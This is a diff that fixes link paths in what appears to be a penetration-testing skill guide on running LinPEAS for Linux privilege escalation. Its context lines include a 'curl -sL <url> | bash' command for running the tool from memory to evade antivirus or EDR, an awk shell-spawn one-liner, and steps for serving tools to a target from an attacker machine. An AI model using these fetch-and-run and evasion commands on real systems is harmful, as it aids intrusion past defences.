@@ -217,7 +217,7 @@ See [../../../Global_References/mitre_mapping.md](../../../Global_References/mit
 
 ### Issue: AV or EDR blocks LinPEAS execution
 
-**Solution**: Use the [Python](../../Software_Engineering_and_Other/Languages/python/SKILL.md)/PSPY alternative or compile a custom version.
+**Solution**: Use the [Python](../../Software_Engineering_and_Other/Languages/python/python/SKILL.md)/PSPY alternative or compile a custom version.
 ```bash
 # Run from memory (no disk write)
 curl -sL <url> | bash
@@ -240,7 +240,7 @@ awk 'BEGIN {system("/bin/bash")}'
 
 **Solution**: Transfer LinPEAS via the attacker machine.
 ```bash
-# On attacker ([Python](../../Software_Engineering_and_Other/Languages/python/SKILL.md) HTTP server)
+# On attacker ([Python](../../Software_Engineering_and_Other/Languages/python/python/SKILL.md) HTTP server)
 python3 -m http.server 8080
 
 # On target
